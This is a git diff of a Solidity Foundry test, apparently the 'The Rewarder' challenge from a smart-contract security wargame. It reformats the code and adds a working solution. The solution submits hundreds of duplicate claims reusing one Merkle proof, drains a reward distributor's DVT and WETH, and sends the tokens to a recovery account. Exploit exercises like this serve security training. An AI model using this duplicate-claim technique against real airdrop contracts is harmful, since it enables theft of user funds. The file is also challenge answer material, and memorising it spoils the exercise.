@@ -54,8 +54,12 @@ contract TheRewarderChallenge is Test {
         weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();
 
         // Calculate roots for DVT and WETH distributions
-        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
-        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
         merkle = new Merkle();
         dvtRoot = merkle.getRoot(dvtLeaves);
         wethRoot = merkle.getRoot(wethLeaves);
@@ -107,11 +111,17 @@ contract TheRewarderChallenge is Test {
 
         // Alice claims once
         vm.startPrank(alice);
-        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
 
         // Alice cannot claim twice
         vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
-        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
         vm.stopPrank(); // stop alice prank
 
         vm.stopPrank(); // stop deployer prank
@@ -135,11 +145,13 @@ contract TheRewarderChallenge is Test {
         assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);
 
         // After Alice's claim, distributor still has enough tokens to distribute
-        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
+        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT -
+            ALICE_DVT_CLAIM_AMOUNT;
         assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
         assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);
 
-        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
+        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT -
+            ALICE_WETH_CLAIM_AMOUNT;
         assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
         assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
     }
@@ -148,7 +160,75 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        // Player address = 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        // grep -n "\"address\":" test/the-rewarder/dvt-distribution.json | grep -n "0x44E97aF4418b7a17AABD8090bEA0A471a366305C" | cut -d: -f1 | awk '{print $1-1}' returns 188
+        uint256 PLAYER_INDEX_IN_DVT_DISTRIBUTION = 188;
+        // grep -n "\"address\":" test/the-rewarder/weth-distribution.json | grep -n "0x44E97aF4418b7a17AABD8090bEA0A471a366305C" | cut -d: -f1 | awk '{print $1-1}' returns 188
+        uint256 PLAYER_INDEX_IN_WETH_DISTRIBUTION = 188;
+
+        // Set DVT and WETH as tokens to claim
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        uint256 dvtClaimsLength = IERC20(address(dvt)).balanceOf(
+            address(distributor)
+        ) / PLAYER_DVT_CLAIM_AMOUNT;
+
+        uint256 wethClaimsLength = IERC20(address(weth)).balanceOf(
+            address(distributor)
+        ) / PLAYER_WETH_CLAIM_AMOUNT;
+
+        // Create Player's claims
+        uint256 totalClaims = dvtClaimsLength + wethClaimsLength;
+        Claim[] memory claims = new Claim[](totalClaims);
+
+        for (uint256 i = 0; i < claims.length; i++) {
+            if (i < dvtClaimsLength) {
+                // DVT claims
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: PLAYER_DVT_CLAIM_AMOUNT,
+                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array = DVT
+                    proof: merkle.getProof(
+                        dvtLeaves,
+                        PLAYER_INDEX_IN_DVT_DISTRIBUTION
+                    ) // Player's address is at index 188
+                });
+            } else {
+                // WETH claims
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first WETH batch
+                    amount: PLAYER_WETH_CLAIM_AMOUNT,
+                    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array = WETH
+                    proof: merkle.getProof(
+                        wethLeaves,
+                        PLAYER_INDEX_IN_WETH_DISTRIBUTION
+                    ) // Player's address is at index 188
+                });
+            }
+        }
+
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -156,18 +236,30 @@ contract TheRewarderChallenge is Test {
      */
     function _isSolved() private view {
         // Player saved as much funds as possible, perhaps leaving some dust
-        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
-        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");
+        assertLt(
+            dvt.balanceOf(address(distributor)),
+            1e16,
+            "Too much DVT in distributor"
+        );
+        assertLt(
+            weth.balanceOf(address(distributor)),
+            1e15,
+            "Too much WETH in distributor"
+        );
 
         // All funds sent to the designated recovery account
         assertEq(
             dvt.balanceOf(recovery),
-            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
+            TOTAL_DVT_DISTRIBUTION_AMOUNT -
+                ALICE_DVT_CLAIM_AMOUNT -
+                dvt.balanceOf(address(distributor)),
             "Not enough DVT in recovery account"
         );
         assertEq(
             weth.balanceOf(recovery),
-            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
+            TOTAL_WETH_DISTRIBUTION_AMOUNT -
+                ALICE_WETH_CLAIM_AMOUNT -
+                weth.balanceOf(address(distributor)),
             "Not enough WETH in recovery account"
         );
     }
@@ -178,14 +270,20 @@ contract TheRewarderChallenge is Test {
     }
 
     // Utility function to read rewards file and load it into an array of leaves
-    function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
-        Reward[] memory rewards =
-            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+    function _loadRewards(
+        string memory path
+    ) private view returns (bytes32[] memory leaves) {
+        Reward[] memory rewards = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
+            (Reward[])
+        );
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
-            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+            leaves[i] = keccak256(
+                abi.encodePacked(rewards[i].beneficiary, rewards[i].amount)
+            );
         }
     }
 }
